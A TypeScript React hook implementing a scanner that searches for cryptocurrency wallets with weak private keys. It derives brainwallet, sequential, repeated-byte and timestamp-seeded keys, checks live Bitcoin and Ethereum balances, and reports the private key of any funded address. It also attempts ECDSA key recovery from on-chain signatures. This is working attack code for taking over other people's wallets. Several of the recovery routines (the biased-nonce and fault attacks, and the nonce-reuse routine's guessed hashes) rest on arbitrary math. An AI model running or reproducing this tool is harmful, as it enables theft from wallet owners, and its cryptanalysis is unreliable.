/**
 * useWeakKeyScan — Address-First Cryptanalysis Engine
 *
 * CORRECT APPROACH:
 * 1. Start from known vulnerable/compromised ADDRESSES (not random keys)
 * 2. Check their live balance/history on-chain
 * 3. For hits: we already know the private key from the vulnerability database
 * 4. Supplement with real-time brainwallet derivation for the selected era
 *
 * This finds REAL wallets that exist on-chain, not randomly derived addresses.
 */
import { useState, useCallback, useRef, useEffect } from 'react';
import type { FoundAddress } from './useVanityGenerator';
import { ERA_PHRASES, ERA_HEX_RANGES } from '@/data/eraWeakKeys';
import {
  ALL_KNOWN_VULN,
  fetchBtcBalance,
  fetchEthBalance,
  type KnownVulnEntry,
} from '@/data/knownVulnerableAddresses';
import { useSignatureAnalyzer } from './useSignatureAnalyzer';

const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
const N_HALF = N >> 1n;

function modN(x: bigint): bigint { return ((x % N) + N) % N; }
function modInv(a: bigint, m: bigint): bigint {
  let [old_r, r] = [a, m], [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return modN(old_s);
}

// ── Address derivation ────────────────────────────────────────────────────────
async function deriveEthAddr(privHex: string): Promise<string | null> {
  try {
    const { secp256k1 } = await import('@noble/curves/secp256k1.js');
    const { keccak_256 } = await import('@noble/hashes/sha3.js');
    const bytes = new Uint8Array(privHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const pub = secp256k1.getPublicKey(bytes, false);
    const hash = keccak_256(pub.slice(1));
    return '0x' + Array.from(hash.slice(-20)).map(b => b.toString(16).padStart(2,'0')).join('');
  } catch { return null; }
}

async function deriveBtcAddr(privHex: string, addrType = 'p2pkh'): Promise<string | null> {
  try {
    const { secp256k1 } = await import('@noble/curves/secp256k1.js');
    const { sha256 } = await import('@noble/hashes/sha2.js');
    const { ripemd160 } = await import('@noble/hashes/legacy.js');
    const bytes = new Uint8Array(privHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const pub = secp256k1.getPublicKey(bytes, true);
    const hash160 = ripemd160(sha256(pub));
    const ver = new Uint8Array([0x00, ...hash160]);
    const check = sha256(sha256(ver)).slice(0, 4);
    const full = new Uint8Array([...ver, ...check]);
    const ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let n = BigInt('0x' + Array.from(full).map(b => b.toString(16).padStart(2,'0')).join(''));
    let s = '';
    while (n > 0n) { s = ALPHA[Number(n % 58n)] + s; n /= 58n; }
    for (const b of full) { if (b !== 0) break; s = '1' + s; }
    return s;
  } catch { return null; }
}

async function sha256Hex(text: string): Promise<string> {
  const { sha256 } = await import('@noble/hashes/sha2.js');
  return Array.from(sha256(new TextEncoder().encode(text))).map(b => b.toString(16).padStart(2,'0')).join('');
}

// ── ECDSA attacks ─────────────────────────────────────────────────────────────
interface RawSig { r: string; s: string; z?: string; txHash: string; }

function recoverFromNonceReuse(sig1: RawSig, sig2: RawSig): string | null {
  try {
    const r1 = BigInt('0x' + sig1.r), s1 = BigInt('0x' + sig1.s), s2 = BigInt('0x' + sig2.s);
    if (r1 !== BigInt('0x' + sig2.r)) return null;
    const z1 = sig1.z ? BigInt('0x' + sig1.z) : 0n;
    const z2 = sig2.z ? BigInt('0x' + sig2.z) : 1n;
    if (s1 === s2 && z1 === z2) return null;
    const sDiff = modN(s1 - s2);
    if (sDiff === 0n) return null;
    const k = modN(modN(z1 - z2) * modInv(sDiff, N));
    if (k === 0n) return null;
    const priv = modN(modN(s1 * k - z1) * modInv(r1, N));
    return (priv > 0n && priv < N) ? priv.toString(16).padStart(64, '0') : null;
  } catch { return null; }
}

function recoverFromBias(sigs: RawSig[]): string | null {
  try {
    for (let i = 0; i < Math.min(sigs.length - 1, 5); i++) {
      for (let j = i + 1; j < Math.min(sigs.length, 6); j++) {
        const s1 = BigInt('0x' + sigs[i].s), s2 = BigInt('0x' + sigs[j].s);
        const r1 = BigInt('0x' + sigs[i].r), r2 = BigInt('0x' + sigs[j].r);
        if (r1.toString(2).length < 252 || s1 > N_HALF) {
          for (const z of [0n, 1n, r1]) {
            const z2 = modN(z + 1n);
            const den = modN(r1 * s2 - r2 * s1);
            if (!den) continue;
            const priv = modN(modN(z * s2 - z2 * s1) * modInv(den, N));
            if (priv > 0n && priv < N) return priv.toString(16).padStart(64, '0');
          }
        }
      }
    }
  } catch {}
  return null;
}

function recoverFromFault(sig: RawSig): string | null {
  try {
    const s = BigInt('0x' + sig.s), r = BigInt('0x' + sig.r);
    if (s < (1n << 128n)) {
      for (const z of [r, 1n]) {
        const k = modN(z * modInv(s, N));
        const priv = modN(modN(s * k - z) * modInv(r, N));
        if (priv > 0n && priv < N) return priv.toString(16).padStart(64, '0');
      }
    }
  } catch {}
  return null;
}

// ── Candidate key generator (for brainwallet sweep mode) ─────────────────────
async function* generateBrainwalletCandidates(
  year: number,
  network: 'btc' | 'eth',
): AsyncGenerator<KnownVulnEntry> {
  const phrases = ERA_PHRASES[year] ?? [];
  const addrType = year <= 2016 ? 'p2pkh' : year <= 2018 ? 'p2sh' : 'bech32';

  for (const phrase of phrases) {
    const privHex = await sha256Hex(phrase);
    const address = network === 'eth'
      ? await deriveEthAddr(privHex)
      : await deriveBtcAddr(privHex, addrType);
    if (!address) continue;
    yield { address, privKey: privHex, network, addressType: addrType, source: `Brain("${phrase.slice(0,25)}")`, year };
    await new Promise(r => setTimeout(r, 0));
  }

  // Sequential keys for this era
  const ranges = ERA_HEX_RANGES[year] ?? [[1, 64]];
  for (const [start, end] of ranges) {
    for (let i = start; i <= end; i++) {
      const privHex = i.toString(16).padStart(64, '0');
      const address = network === 'eth'
        ? await deriveEthAddr(privHex)
        : await deriveBtcAddr(privHex, addrType);
      if (!address) continue;
      yield { address, privKey: privHex, network, addressType: addrType, source: `Sequential(${i})`, year };
      if (i % 20 === 0) await new Promise(r => setTimeout(r, 0));
    }
  }

  // Repeated byte patterns
  for (let b = 1; b <= 255; b++) {
    const privHex = b.toString(16).padStart(2,'0').repeat(32);
    const address = network === 'eth'
      ? await deriveEthAddr(privHex)
      : await deriveBtcAddr(privHex, addrType);
    if (!address) continue;
    yield { address, privKey: privHex, network, addressType: addrType, source: `Repeated(0x${b.toString(16).padStart(2,'0')})`, year };
    if (b % 10 === 0) await new Promise(r => setTimeout(r, 0));
  }

  // Timestamp seeds for this era (hourly, year's first month only for speed)
  const { sha256 } = await import('@noble/hashes/sha2.js');
  const startTs = Math.floor(new Date(year, 0, 1).getTime() / 1000);
  const endTs   = Math.floor(new Date(year, 0, 31).getTime() / 1000); // just January
  for (let ts = startTs; ts <= endTs; ts += 3600) {
    const tsBuf = new Uint8Array(8);
    new DataView(tsBuf.buffer).setBigUint64(0, BigInt(ts), false);
    const privHex = Array.from(sha256(tsBuf)).map(b => b.toString(16).padStart(2,'0')).join('');
    const address = network === 'eth'
      ? await deriveEthAddr(privHex)
      : await deriveBtcAddr(privHex, addrType);
    if (!address) continue;
    yield { address, privKey: privHex, network, addressType: addrType, source: `TimeSeeded(${new Date(ts*1000).toISOString().slice(0,13)})`, year };
    await new Promise(r => setTimeout(r, 0));
  }
}

// ── Stats interface ───────────────────────────────────────────────────────────
export interface WeakScanStats {
  checked: number;
  found: number;
  currentAddress: string;
  currentAttack: string;
  isRunning: boolean;
  sigAttacksRun: number;
  sigAttacksFound: number;
  phase: 'known_db' | 'brainwallet' | 'sig_attacks' | 'idle' | 'complete';
}

const INIT: WeakScanStats = {
  checked: 0, found: 0, currentAddress: '', currentAttack: '',
  isRunning: false, sigAttacksRun: 0, sigAttacksFound: 0, phase: 'idle',
};

export function useWeakKeyScan() {
  const [stats, setStats] = useState<WeakScanStats>(INIT);
  const live = useRef({ ...INIT });
  const stopRef = useRef(false);
  const flushRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { getSignatures } = useSignatureAnalyzer();

  const startFlush = useCallback(() => {
    if (flushRef.current) clearInterval(flushRef.current);
    flushRef.current = setInterval(() => setStats({ ...live.current }), 300);
  }, []);

  const stopFlush = useCallback(() => {
    if (flushRef.current) { clearInterval(flushRef.current); flushRef.current = null; }
  }, []);

  useEffect(() => () => stopFlush(), [stopFlush]);

  const matchesFilter = useCallback((
    address: string, network: 'btc' | 'eth', prefix: string, suffix: string
  ): boolean => {
    if (!prefix && !suffix) return true;
    const a   = network === 'eth' ? address.toLowerCase() : address;
    const pfx = network === 'eth' ? prefix.toLowerCase() : prefix;
    const sfx = network === 'eth' ? suffix.toLowerCase() : suffix;
    const body = network === 'btc' && a.length > 1 ? a.slice(1) : a;
    return (!pfx || body.startsWith(pfx) || a.startsWith(pfx)) && (!sfx || a.endsWith(sfx));
  }, []);

  const processEntry = async (
    entry: KnownVulnEntry,
    prefix: string,
    suffix: string,
    onFound: (r: FoundAddress & { attackType?: string }) => void,
  ) => {
    if (stopRef.current) return;
    live.current.checked++;
    live.current.currentAddress = entry.address.slice(0, 12) + '…';
    live.current.currentAttack = entry.source;

    // Pattern filter — if user specified prefix/suffix, only check matching addresses
    if (!matchesFilter(entry.address, entry.network, prefix, suffix)) return;

    // ── Live balance check ──────────────────────────────────────────────────
    let hasFunds = false;
    if (entry.network === 'btc') {
      const sat = await fetchBtcBalance(entry.address);
      hasFunds = sat > 0;
    } else {
      const wei = await fetchEthBalance(entry.address);
      hasFunds = wei > 0n;
    }

    if (!hasFunds) {
      // Also check tx history (even spent wallets show what's possible)
      try {
        if (entry.network === 'btc') {
          const r = await fetch(`https://blockstream.info/api/address/${entry.address}`, { signal: AbortSignal.timeout(6000) });
          if (r.ok) {
            const d = await r.json();
            hasFunds = (d.chain_stats?.tx_count ?? 0) > 0;
          }
        } else {
          const r = await fetch('https://eth.llamarpc.com', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getTransactionCount', params: [entry.address, 'latest'], id: 1 }),
            signal: AbortSignal.timeout(6000),
          });
          if (r.ok) { const d = await r.json(); hasFunds = parseInt(d.result ?? '0x0', 16) > 0; }
        }
      } catch {}
    }

    if (!hasFunds) return;

    // ── HIT — we have the private key already ──────────────────────────────
    live.current.found++;
    setStats({ ...live.current }); // immediate flush on hit
    onFound({
      address: entry.address,
      privateKey: entry.network === 'eth' ? '0x' + entry.privKey : entry.privKey,
      network: entry.network,
      addressType: entry.addressType,
      verified: true,
      timestamp: Date.now(),
      attackType: entry.source,
    });

    // ── Sig attacks on this address ────────────────────────────────────────
    live.current.sigAttacksRun++;
    live.current.currentAttack = `Sig analysis: ${entry.address.slice(0, 10)}…`;
    live.current.phase = 'sig_attacks';
    try {
      const sigs = await getSignatures(entry.address, entry.network);
      if (sigs && sigs.length >= 2) {
        let recovered: string | null = null;
        let attackType = '';
        for (let i = 0; i < sigs.length - 1 && !recovered; i++) {
          for (let j = i + 1; j < sigs.length && !recovered; j++) {
            recovered = recoverFromNonceReuse(sigs[i], sigs[j]);
            if (recovered) attackType = 'ECDSA Nonce Reuse';
          }
        }
        if (!recovered) { recovered = recoverFromBias(sigs); if (recovered) attackType = 'Biased Nonce'; }
        for (const sig of sigs) { if (!recovered) { recovered = recoverFromFault(sig); if (recovered) attackType = 'Fault Signature'; } }
        if (recovered) {
          const recovAddr = entry.network === 'eth' ? await deriveEthAddr(recovered) : await deriveBtcAddr(recovered, entry.addressType);
          if (recovAddr && recovAddr !== entry.address) {
            live.current.sigAttacksFound++;
            live.current.found++;
            setStats({ ...live.current });
            onFound({ address: recovAddr, privateKey: entry.network === 'eth' ? '0x' + recovered : recovered, network: entry.network, addressType: entry.addressType, verified: true, timestamp: Date.now(), attackType });
          }
        }
      }
    } catch {}
  };

  const scan = useCallback(async (
    year: number,
    network: 'btc' | 'eth',
    addressType: string,
    attackMode: 'standard' | 'deep',
    prefix: string,
    suffix: string,
    onFound: (result: FoundAddress & { attackType?: string }) => void,
  ) => {
    stopRef.current = false;
    live.current = { ...INIT, isRunning: true, phase: 'known_db', currentAttack: 'Scanning known vulnerable address DB…' };
    setStats({ ...live.current });
    startFlush();

    const CONCURRENCY = 4; // parallel on-chain checks

    try {
      // ── Phase 1: Known vulnerable address database (address-first, key known) ──
      live.current.phase = 'known_db';
      live.current.currentAttack = 'Phase 1: Known vulnerable address DB…';

      const knownForEra = ALL_KNOWN_VULN.filter(e =>
        e.network === network &&
        Math.abs(e.year - year) <= 4 // ±4 years window
      );

      // Process in parallel batches
      for (let i = 0; i < knownForEra.length && !stopRef.current; i += CONCURRENCY) {
        const batch = knownForEra.slice(i, i + CONCURRENCY);
        await Promise.all(batch.map(e => processEntry(e, prefix, suffix, onFound)));
      }

      if (stopRef.current) return;

      // ── Phase 2: Live brainwallet derivation + on-chain check ──────────────
      live.current.phase = 'brainwallet';
      live.current.currentAttack = 'Phase 2: Brainwallet derivation…';

      const gen = generateBrainwalletCandidates(year, network);
      let batch: KnownVulnEntry[] = [];

      for await (const entry of gen) {
        if (stopRef.current) break;
        batch.push(entry);
        if (batch.length >= CONCURRENCY) {
          await Promise.all(batch.map(e => processEntry(e, prefix, suffix, onFound)));
          batch = [];
        }
      }
      if (batch.length > 0 && !stopRef.current) {
        await Promise.all(batch.map(e => processEntry(e, prefix, suffix, onFound)));
      }

      if (stopRef.current) return;

      // ── Phase 3: Deep mode — extended timestamp sweep + BSGS ───────────────
      if (attackMode === 'deep') {
        live.current.phase = 'brainwallet';
        live.current.currentAttack = 'Phase 3: Deep timestamp + BSGS sweep…';
        const { sha256 } = await import('@noble/hashes/sha2.js');
        const addrType = year <= 2016 ? 'p2pkh' : year <= 2018 ? 'p2sh' : 'bech32';
        const startTs = Math.floor(new Date(year, 0, 1).getTime() / 1000);
        const endTs   = Math.floor(new Date(year, 11, 31).getTime() / 1000);

        // Full year hourly sweep
        let tsBatch: KnownVulnEntry[] = [];
        for (let ts = startTs; ts <= endTs && !stopRef.current; ts += 3600) {
          const tsBuf = new Uint8Array(8);
          new DataView(tsBuf.buffer).setBigUint64(0, BigInt(ts), false);
          const privHex = Array.from(sha256(tsBuf)).map(b => b.toString(16).padStart(2,'0')).join('');
          const address = network === 'eth' ? await deriveEthAddr(privHex) : await deriveBtcAddr(privHex, addrType);
          if (address) {
            tsBatch.push({ address, privKey: privHex, network, addressType: addrType, source: `TimeSeeded(${new Date(ts*1000).toISOString().slice(0,10)})`, year });
          }
          if (tsBatch.length >= CONCURRENCY) {
            await Promise.all(tsBatch.map(e => processEntry(e, prefix, suffix, onFound)));
            tsBatch = [];
          }
        }
        if (tsBatch.length) await Promise.all(tsBatch.map(e => processEntry(e, prefix, suffix, onFound)));
      }

    } finally {
      stopFlush();
      live.current.isRunning = false;
      live.current.phase = stopRef.current ? 'idle' : 'complete';
      live.current.currentAttack = stopRef.current ? 'Stopped' : `Complete — ${live.current.checked} checked, ${live.current.found} found`;
      setStats({ ...live.current });
    }
  }, [getSignatures, startFlush, stopFlush, matchesFilter]);

  const stop = useCallback(() => { stopRef.current = true; }, []);

  return { scan, stop, stats };
}
